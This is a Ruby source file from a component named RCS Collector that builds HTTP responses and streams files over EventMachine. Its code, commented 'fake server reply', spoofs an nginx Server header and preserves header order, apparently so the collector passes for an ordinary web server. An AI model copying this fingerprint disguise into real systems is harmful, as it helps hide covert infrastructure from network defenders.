#
# response handling classes
#

require_relative 'em_streamer'

# from RCS::Common
require 'rcs-common/trace'

require 'net/http'

module RCS
module Collector

  HTTP_STATUS_CODES = {
    200 => 'OK',
    301 => 'Moved Permanently',
    302 => 'Found',
    304 => 'Not Modified',
    400 => 'Bad Request',
    401 => 'Unauthorized',
    403 => 'Forbidden',
    404 => 'Not Found',
    405 => 'Method Not Allowed',
    406 => 'Not Acceptable',
    408 => 'Request Timeout',
    409 => 'Conflict',
    500 => 'Internal Server Error',
    501 => 'Not Implemented',
    502 => 'Bad Gateway',
    503 => 'Service Unavailable',
    504 => 'Gateway Timeout',
    505 => 'HTTP Version Not Supported',
  }

class RESTResponse
  include RCS::Tracer

  attr_accessor :status, :content, :content_type, :cookie

  def initialize(status, content = '', opts = {}, callback=proc{})
    @status = status
    @status = RESTController::STATUS_SERVER_ERROR if @status.nil? or @status.class != Fixnum
    
    @content = content
    @content_type = opts[:content_type]
    @content_type ||= 'text/html'
    @location ||= opts[:location]
    @cookie ||= opts[:cookie]
    
    @callback=callback
  end

  #
  # BEWARE: for any reason this method should raise an exception!
  # An exception raised here WILL NOT be cough, resulting in a crash.
  #
  def prepare_response(connection, request)

    @request = request
    @connection = connection
    @response = EM::DelegatedHttpResponse.new @connection

    @response.status = @status
    @response.status_string = HTTP_STATUS_CODES[@response.status] unless @response.status.eql? 444

    begin
      @response.content = (@content_type == 'application/json') ? @content.to_json : @content
    rescue Exception => e
      @response.status = RESTController::STATUS_SERVER_ERROR
      @response.content = 'JSON_SERIALIZATION_ERROR'
      trace :error, e.message
      trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
    end
    # fake server reply
    @response.headers['Server'] = 'nginx'
    @response.headers['Date'] = Time.now.getutc.strftime("%a, %d %b %Y %H:%M:%S GMT")

    @response.headers['Content-Type'] = @content_type
    @response.headers['Content-Length'] = @response.content.bytesize

    # fixup_headers override to evade content-length reset
    metaclass = class << @response; self; end
    metaclass.send(:define_method, :fixup_headers, proc {})
    # override the generate_header_lines to NOT sort the headers in the reply
    metaclass.send(:define_method, :generate_header_lines, proc { |in_hash|
      out_ary = []
   			in_hash.keys.each {|k|
   				v = in_hash[k]
   				if v.is_a?(Array)
   					v.each {|v1| out_ary << "#{k}: #{v1}\r\n" }
   				else
   					out_ary << "#{k}: #{v}\r\n"
   				end
   			}
   		out_ary
    })

    @response.headers['Set-Cookie'] = "ID=" + @cookie unless @cookie.nil?

    # used for redirects
    @response.headers['Location'] = @location unless @location.nil?

    if request[:headers] && request[:headers][:connection] && request[:headers][:connection].downcase == 'keep-alive'
      # keep the connection open to allow multiple requests on the same connection
      # this will increase the speed of sync since it decrease the latency on the net
      @response.keep_connection_open true
      @response.headers['Connection'] = 'keep-alive'
    else
      @response.headers['Connection'] = 'close'
    end

    self
  end

  def content
    @response.content
  end

  def headers
    @response.headers
  end

  def send_response
    @response.send_response
    @callback
  end

end # RESTResponse

class RESTFileStream

  def initialize(filename, callback=proc{})
    @filename = filename
    @callback = callback
  end

  def prepare_response(connection, request)

    @request = request
    @connection = connection
    @response = EM::DelegatedHttpResponse.new @connection

    @response.status = RESTController::STATUS_OK
    @response.status_string = HTTP_STATUS_CODES[@response.status]

    # fake server reply
    @response.headers['Server'] = 'nginx'
    @response.headers['Date'] = Time.now.getutc.strftime("%a, %d %b %Y %H:%M:%S GMT")

    @response.headers["Content-Length"] = File.size @filename
    # RCS::MimeType (rcs-common)
    @response.headers["Content-Type"] = RCS::MimeType.get @filename

    @response.headers["ETag"] = Digest::MD5.file(@filename).hexdigest

    # fixup_headers override to evade content-length reset
    metaclass = class << @response; self; end
    metaclass.send(:define_method, :fixup_headers, proc {})
    # override the generate_header_lines to NOT sort the headers in the reply
    metaclass.send(:define_method, :generate_header_lines, proc { |in_hash|
      out_ary = []
   			in_hash.keys.each {|k|
   				v = in_hash[k]
   				if v.is_a?(Array)
   					v.each {|v1| out_ary << "#{k}: #{v1}\r\n" }
   				else
   					out_ary << "#{k}: #{v}\r\n"
   				end
   			}
   		out_ary
    })

    # always close after streaming a file
    @response.headers['Connection'] = 'close'

    self
  end

  def content
    @response.content
  end

  def headers
    @response.headers
  end

  def send_response
    @response.send_headers
    streamer = EventMachine::FilesystemStreamer.new(@connection, @filename, :http_chunks => false )
    streamer.callback { EventMachine::close_connection(@connection.signature, true); @callback.call unless @callback.nil? }
  end
end # RESTFileStream

end # ::Collector
end # ::RCS
